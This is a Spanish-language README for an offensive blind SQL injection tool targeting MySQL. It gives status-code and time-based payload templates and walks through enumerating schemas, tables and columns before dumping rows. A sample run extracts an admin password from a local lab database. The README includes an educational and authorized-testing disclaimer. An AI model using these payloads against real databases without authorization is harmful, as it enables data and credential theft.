# Blind SQLi - Status Code & Time Based

Herramienta de Blind SQL Injection para enumeracion completa de bases de datos MySQL mediante dos tecnicas: **Conditional (Status Code)** y **Time-Based (Sleep)**.

## Requisitos

```bash
pip install requests pwntools
```

## Uso

```bash
python3 status_code/sqli.py
```

La herramienta te pedira de forma interactiva:

1. **URL objetivo** - URL del endpoint vulnerable (ej: `http://localhost/searchUsers.php`)
2. **Parametro vulnerable** - Parametro inyectable (ej: `id`)
3. **Metodo de inyeccion** - Conditional (Status Code) o Time-Based (Sleep)

## Metodos de inyeccion

### Conditional (Status Code)

Determina si la condicion es verdadera o falsa basandose en el codigo de respuesta HTTP (200 = true).

```
?id=9 or ascii(substring((query),1,1))=72
```

### Time-Based (Sleep)

Determina si la condicion es verdadera midiendo el tiempo de respuesta del servidor.

```
?id=1 and if(ascii(substr((query),1,1))=72,sleep(0.35),1)
```

## Flujo de enumeracion

```
Bases de datos
    |
    +-- Seleccionar base de datos
            |
            +-- Listar tablas
                    |
                    +-- Seleccionar tabla
                            |
                            +-- Listar columnas
                                    |
                                    +-- Dump de todos los datos
```

1. **Bases de datos** - Extrae todas las bases de datos desde `information_schema.schemata`
2. **Tablas** - Lista las tablas de la base de datos seleccionada
3. **Columnas** - Lista las columnas de la tabla seleccionada
4. **Dump** - Extrae todos los valores de cada columna y los presenta en una tabla formateada

## Tecnicas utilizadas

- **Fuerza bruta caracter a caracter** - Compara cada posicion con codigos ASCII (32-126)
- **Valores en hexadecimal** - Los nombres de DB/tabla se convierten a hex (`0x4861636b3475`) para evitar conflictos con comillas en la inyeccion
- **group_concat con separador hex** - Usa `separator 0x2c` (coma) para concatenar resultados

## Ejemplo

```
  ____  _ _           _   ____   ___  _     _
 | __ )| (_)_ __   __| | / ___| / _ \| |   (_)
 |  _ \| | | '_ \ / _` | \___ \| | | | |   | |
 | |_) | | | | | | (_| |  ___) | |_| | |___| |
 |____/|_|_|_| |_|\__,_| |____/ \__\_\_____|_|

        [ Blind SQL Injection Tool ]
        [    Status Code & Time     ]
        By amis13 (https://github.com/amis13)

[?] URL objetivo: http://localhost/searchUsers.php
[?] Parametro vulnerable: id
[?] Selecciona metodo (1/2): 1

[+] Bases de datos: information_schema,Hack4u

+---+--------------------+
| # | Database           |
+---+--------------------+
| 1 | information_schema |
| 2 | Hack4u             |
+---+--------------------+

Selecciona una base de datos: 2
[+] Tablas [Hack4u]: users

Selecciona una tabla: 1
[+] Columnas [users]: id,username,password

[*] Dumpeando todas las columnas de 'users'...

+---+----------+----------+
| # | username | password |
+---+----------+----------+
| 1 | admin    | s3cr3t   |
+---+----------+----------+
```

## Estructura

```
sqli/
├── README.md
└── status_code/
    ├── sqli.py                # Herramienta principal (dinamica)
    ├── sqli_conditional.py    # Script original - Status Code
    └── sqli_time.py           # Script original - Time-Based
```

## Disclaimer

Esta herramienta es solo para fines educativos y pruebas de penetracion autorizadas. El uso indebido de esta herramienta contra sistemas sin autorizacion es ilegal.

## Autor

**amis13** - [https://github.com/amis13](https://github.com/amis13)
